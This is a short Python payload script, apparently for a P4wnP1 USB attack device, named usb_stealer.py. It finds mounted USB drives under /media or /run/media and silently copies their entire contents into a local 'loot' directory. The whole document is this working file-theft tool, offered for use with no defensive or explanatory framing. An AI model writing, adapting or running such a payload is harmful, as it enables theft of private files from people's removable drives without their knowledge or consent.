# File: /opt/p4wnp1/payloads/hid/usb_stealer.py
import os
import shutil
import subprocess

LOOT_DIR = "/opt/p4wnp1/loot/usb"
os.makedirs(LOOT_DIR, exist_ok=True)

print("[*] Searching for mounted USB drives...")

try:
    mounts = subprocess.check_output("lsblk -o MOUNTPOINT -nr", shell=True).decode().splitlines()
    for mount in mounts:
        if mount.startswith("/media") or mount.startswith("/run/media"):
            print(f"[*] Found USB mount: {mount}")
            dest = os.path.join(LOOT_DIR, os.path.basename(mount))
            shutil.copytree(mount, dest, dirs_exist_ok=True)
except Exception as e:
    print(f"[!] Error: {e}")
